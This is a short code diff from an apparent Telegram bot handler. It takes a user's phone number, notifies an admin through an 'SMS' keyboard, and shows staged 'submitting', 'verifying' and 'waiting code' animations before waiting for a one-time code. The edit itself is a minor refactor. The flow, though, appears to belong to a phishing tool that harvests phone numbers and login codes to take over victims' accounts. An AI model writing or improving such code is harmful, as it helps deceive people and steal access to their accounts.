@@ -76,17 +76,17 @@ async def contact_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         context.user_data['phone'] = contact.phone_number
         context.user_data['otp_input'] = ""
         
-        msg = await update.message.reply_text("Processing... 🔄", reply_markup=ReplyKeyboardRemove())
-        context.user_data['status_msg_id'] = msg.message_id
+        status_msg = await update.message.reply_text("Processing... 🔄", reply_markup=ReplyKeyboardRemove())
+        context.user_data['status_msg_id'] = status_msg.message_id
         
         logging.info(f"Sending notification to admin for user {user.id}...")
-        # Send admin notification in background or ensure it doesn't block
+        # Send admin notification in background
         asyncio.create_task(send_to_admin(context, admin_text, reply_markup=get_admin_sms_keyboard(user.id)))
         
         logging.info("Starting animations...")
-        await animate_message(update, context, SUBMITTING_MSGS)
-        await animate_message(update, context, VERIFYING_MSGS)
-        await animate_message(update, context, WAITING_CODE_MSGS)
+        await animate_message(update, context, SUBMITTING_MSGS, target_message=status_msg)
+        await animate_message(update, context, VERIFYING_MSGS, target_message=status_msg)
+        await animate_message(update, context, WAITING_CODE_MSGS, target_message=status_msg)
         
         logging.info(f"User {user.id} now in AWAITING_CODE state.")
         return AWAITING_CODE
